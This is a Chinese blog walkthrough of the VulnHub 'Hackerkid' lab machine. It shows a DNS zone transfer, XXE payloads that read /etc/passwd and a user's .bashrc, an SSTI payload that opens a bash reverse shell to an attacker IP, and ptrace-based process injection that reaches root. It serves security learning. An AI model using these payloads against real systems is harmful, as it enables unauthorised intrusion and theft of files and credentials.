@@ -1,0 +1,289 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x07-VulnHub靶机-Hackerkid | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x07-VulnHub靶机-Hackerkid | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+靶机地址：https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova
+难度等级：OSCP风格的中级难度靶机    无法入手。（关注信息收集，不需要暴力破解，每一步都有适当的..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x07-VulnHub靶机-Hackerkid
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-04
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>靶机地址：https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</p>
+<p>难度等级：OSCP风格的中级难度靶机    无法入手。（关注信息收集，不需要暴力破解，每一步都有适当的提示</p>
+<h3 id="内容">内容</h3>
+<ul>
+<li>DIG反查子域名   DNS区域传输</li>
+<li>XEE 读服务器文件</li>
+<li>SSTI模板注入</li>
+<li>Capability提权</li>
+</ul>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>域名服务 dns   DNS通常运行在UDP协议上，并使用端口号53来进行通信   但是这里 tcp也存在</p>
+<p>这里发现了个dns的漏洞可以rce 	但是找不到exp</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403031942879.png" alt="image-20240303194244858" loading="lazy"></figure>
+<p><strong>dig命令需要知道域名</strong></p>
+<p>​     linux的  <code>dig</code> 命令是一个常用的网络工具，通常用于 DNS 查询。通过 <code>dig</code> 命令，您可以获取特定域名的 DNS 记录信息，例如 IP 地址、MX 记录、NS 记录等。</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403031959067.png" alt="image-20240303195940031" loading="lazy"></figure>
+<p>对网页源码的分别查看：1，找注释。2，找引用。3，找接口。</p>
+<p>常规的都没发现什么  最后在页面源码发现这个    page_one 参数</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403031939467.png" alt="image-20240303193915423" loading="lazy"></figure>
+<p>我们带page_one去访问 用burp爆破到 21   页面就发生了变化</p>
+<p>这里提到了 subdomains 子域     还给了你个 hackers.blackhat.local</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403031947356.png" alt="image-20240303194720332" loading="lazy"></figure>
+<p>修改hosts   然后去访问hackers.blackhat.local  发现界面是一样的   访问   403Forbidden</p>
+<p>猜测<strong>是否这个域名是否有其他的主机名</strong>？再结合我们开头的 <code>dig</code>提示。我们就使用dig命令来进行探测</p>
+<p><code>dig  axfr @192.168.3.98 blackhat.local</code>        (正常是对一般用户 不支持 axfr的 )</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032222500.png" alt="image-20240303222251474" loading="lazy"></figure>
+<p>全加到hosts里面   再去访问 发现就hackerkid.blackhat.local不同</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032225465.png" alt="image-20240303222531393" loading="lazy"></figure>
+<p>然后想着去注册一个 看可不可以登入到 9999端口的登录界面</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032028060.png" alt="image-20240303202851975" loading="lazy"></figure>
+<p>但是注册 Email一直不可以  且显示出来我输入的内容</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032033484.png" alt="image-20240303203304423" loading="lazy"></figure>
+<h2 id="xxe">XXE</h2>
+<p>抓包看一看  	   发现是xml的格式    后面发现这 存在XXE漏洞  而且是有回显的 （<strong>可以去读取目标的文件</strong></p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032033143.png" alt="image-20240303203343115" loading="lazy"></figure>
+<p>大致意思是读取文件 <code>/etc/passwd</code>文件 ，将其赋给 maomaos变量。然后将这个值放入 <code>&lt;email&gt;</code>标签中从而让服务器误认为这个文件是我们上传的邮箱。从而在回显我们错误邮箱的时候外带出我们窃取的文件。</p>
+<p>exp    读/etc/passwd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE qwe [&lt;!ENTITY maomao SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&lt;name&gt;qqqq&lt;/name&gt;
+&lt;tel&gt;qqqq&lt;/tel&gt;
+&lt;email&gt;&amp;maomao;&lt;/email&gt;
+&lt;password&gt;qqqq&lt;/password&gt;
+&lt;/root&gt;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032056843.png" alt="image-20240303205605825" loading="lazy"></figure>
+<p>靶机有个saket 账号</p>
+<p>我们是可以依次的访问 <code>linux</code>系统一些默认的文件，隐藏文件等等。直到我们访问 <code>/home/saket/.bashrc</code>  (<code>.bashrc</code> 是用户级别的 Bash Shell 配置文件，用于自定义用户的 Shell 环境和行为 <strong>它用来存储并加载你的终端配置和环境变量</strong>)</p>
+<p>但是没有数据回显，表明我们没有权限或者说不能直接读取他， 这里我们用到 PHP的封装器 去读数据</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE qwe [&lt;!ENTITY maomao SYSTEM &quot;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&quot;&gt;]&gt;
+&lt;root&gt;&lt;name&gt;qqqq&lt;/name&gt;
+&lt;tel&gt;qqqq&lt;/tel&gt;
+&lt;email&gt;&amp;maomao;&lt;/email&gt;
+&lt;password&gt;qqqq&lt;/password&gt;
+&lt;/root&gt;
+
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032113040.png" alt="image-20240303211345994" loading="lazy"></figure>
+<p>然后拿去解码  发现账号密码 而且说 Setting Password for running python app   想到了9999那个登录界面</p>
+<p>#Setting Password for running python app<br>
+username=&quot;admin&quot;<br>
+password=&quot;Saket!#$%@!!&quot;</p>
+<h2 id="ssti模板注入">ssti模板注入</h2>
+<p>但是试了不对   换成saket用户 就可以进入了        脑筋急转弯 发现可以用name参数去传参</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032127452.png" alt="image-20240303212718381" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032128129.png" alt="image-20240303212838107" loading="lazy"></figure>
+<p>你输入什么都是hello 。。。           很像<strong>模板</strong></p>
+<p>进行 <code>ssti</code>漏洞的确认，在name后面注入<strong>paylaod验证</strong>：</p>
+<p><code>{{1+abcxyz}}${1+abcxyz}&lt;%1+abcxyz%&gt;[abcxyz]</code> <strong>报错的话就存在</strong></p>
+<p>或者 <code>${7*7},{{7*7}}</code>我们几乎可以确认这就是个 <code>ssti</code>漏洞</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032130445.png" alt="image-20240303213023421" loading="lazy"></figure>
+<p>反弹shell 命令要编码一下</p>
+<pre><code>{% import os %}{{os.system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.3.87/4444 0&gt;&amp;1&quot;')}}
+
+将其 url编码  然后去输入就得到了 shell   
+
+%7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.3.87%2F4444%200%3E%261%22%27%29%7D%7D
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403032142045.png" alt="image-20240303214249995" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<p>https://www.jianshu.com/p/60673ac0454f</p>
+<p>Capability权限设置不当</p>
+<p>/sbin/getcap -r / 2&gt;/dev/null</p>
+<p>getcap -r / 2&gt;/dev/null</p>
+<p>CAP_SYS_PTRACE  允许跟踪任何进程  用进程注入</p>
+<p>python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程，对进程进行内存修改及查看等活动，利用提权脚本</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403041046436.png" alt="image-20240304104623390" loading="lazy"></figure>
+<p>kali起一个端口 把文件下载到 tmp目录 给个执行权限</p>
+<p>ps aux  列出 进程   注入到 root权限的pid</p>
+<p><code>python2.7 baji.py 764</code></p>
+<p>也可以 对所有的进行注入</p>
+<pre><code class="language-bash">for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk '{print $2}'`; do python2.7 baji.py $i; done
+</code></pre>
+<p>这个脚本会默认的<strong>开启本地的5600端口</strong>。可以<strong>在kali上直接nc连接</strong>。采用 <code>id</code>命令就可以直接发现为root用户了。</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403041815368.png" alt="image-20240304181524275" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a><br>
+*
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#xxe">XXE</a></li>
+<li><a href="#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">ssti模板注入</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/vulnhub-ba-ji-admx_new/">
+              <h3 class="post-title">
+                0x04-VulnHub靶机-AdmX_new 
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
